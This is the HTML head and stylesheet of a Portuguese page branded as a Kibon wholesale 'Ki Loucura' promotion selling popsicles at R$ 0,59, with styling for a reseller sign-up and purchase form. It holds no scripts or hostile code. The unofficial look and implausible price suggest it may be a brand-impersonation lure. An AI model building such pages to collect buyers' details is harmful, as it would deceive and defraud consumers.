<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kibon Atacado - Promoção Ki Loucura R$ 0,59</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&family=Oswald:wght@700&display=swap" rel="stylesheet">
    <style>
        :root {
            --kibon-red: #E2001A;
            --promo-yellow: #FFD700;
            --promo-pink: #f26cb3;
            --text-light: #FFFFFF;
        }

        * { box-sizing: border-box; font-family: 'Montserrat', sans-serif; margin: 0; padding: 0; }
        
        body {
            background-color: #f0f2f5;
            padding: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        .atacadista-card {
            background-color: var(--kibon-red);
            width: 100%;
            max-width: 500px;
            border-radius: 30px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
            overflow: hidden;
            border: 4px solid var(--promo-yellow);
        }

        /* BANNER PROMOÇÃO ESTILO 'KI LOUCURA' */
        .promo-banner-atacadista {
            background-color: var(--kibon-red);
            color: var(--text-light);
            text-align: center;
            padding: 20px 20px 10px;
            text-transform: uppercase;
        }

        .promo-title-ki {
            font-family: 'Oswald', sans-serif;
            font-size: 16px;
            color: var(--text-light);
            letter-spacing: 1px;
            font-weight: 700;
        }

        .promo-title-loucura {
            font-family: 'Oswald', sans-serif;
            font-size: 34px;
            color: var(--promo-yellow);
            font-weight: 700;
            margin-top: -8px;
            letter-spacing: -1px;
            filter: drop-shadow(0 3px 0 var(--promo-pink));
        }

        .promo-subtitle-picolé {
            font-size: 12px;
            color: var(--promo-pink);
            font-weight: 700;
            letter-spacing: 2px;
            margin-bottom: 15px;
        }

        /* ÁREA EXCLUSIVA DO PREÇO R$ 0,59 */
        .hero-price-atacado {
            background-color: #000;
            color: #fff;
            padding: 20px;
            text-align: center;
            margin: 10px;
            border-radius: 15px;
            border: 2px solid var(--promo-yellow);
        }

        .atacado-tag {
            font-size: 11px;
            color: var(--promo-yellow);
            font-weight: 700;
            letter-spacing: 2px;
        }

        .atacado-main-price {
            font-size: 60px;
            color: var(--text-light);
            font-weight: 900;
            display: block;
            letter-spacing: -3px;
        }

        .bonus-info-label {
            font-size: 10px;
            color: var(--promo-pink);
            font-weight: 600;
        }

        /* FORMULÁRIO PROFISSIONAL */
        .revendedor-form {
            background: rgba(255, 255, 255, 0.98);
            padding: 20px 25px;
            border-top: 1px solid #ddd;
        }

        .form-header-txt {
            text-align: center;
            font-weight: 800;
            font-size: 16px;
            margin-bottom: 15px;
            color: #333;
        }

        .revendedor-form .input-group { margin-bottom: 10px; }
        .revendedor-form label { display: block; font-size: 10px; font-weight: 700; color: #555; margin-bottom: 3px; text-transform: uppercase; }
        .revendedor-form input, select {
            width: 100%; padding: 11px; border: 2px solid #eaeaea; border-radius: 8px;
            font-size: 13px; outline: none; background: #fff; color: #333;
        }
        .revendedor-form input:focus { border-color: var(--kibon-red); }

        .btn-comprar {
            width: 100%; padding: 18px; background: var(--kibon-red); color: white;
            border: none; border-radius: 50px; font-size: 16px; font-weight: 900;
            cursor: pointer; box-shadow: 0 8px 15px rgba(226, 0, 26, 0.4);
            transition: 0.3s; text-transform: uppercase; margin-top: 10px;
        }
        .btn-comprar:hover { transform: translateY(-2px); filter: brightness(1.1); }

        .form-guarantee { text-align: center; font-size: 10px; color: #aaa; margin-top: 20px; text-transform: uppercase; }
    </style>
</head>
